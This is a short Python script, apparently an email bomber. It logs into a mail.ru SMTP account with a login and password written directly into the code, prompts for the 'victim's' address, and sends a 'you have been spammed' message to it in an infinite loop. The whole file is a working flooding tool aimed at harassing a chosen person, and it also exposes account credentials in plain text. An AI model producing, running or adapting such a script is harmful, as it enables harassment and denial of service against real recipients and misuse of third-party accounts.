import smtplib as root
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
def send_email():
	login = 'denisdebil56@mail.ru'
	password = 'awsedrft123'
	url = 'smtp.mail.ru'
	topic = 'спам'
	toaddr = input('email жертвы:')
	message = 'вы были за спамлены'
	msg = MIMEMultipart()
	msg[ 'subject' ] = topic
	msg[ 'from' ] = login
	body = message
	msg.attach(MIMEText(body,'plain'))
	server = root.SMTP_SSL(url,465)
	server.login(login,password)
	while True:
            server.sendmail(login,toaddr,msg.as_string())
send_email()
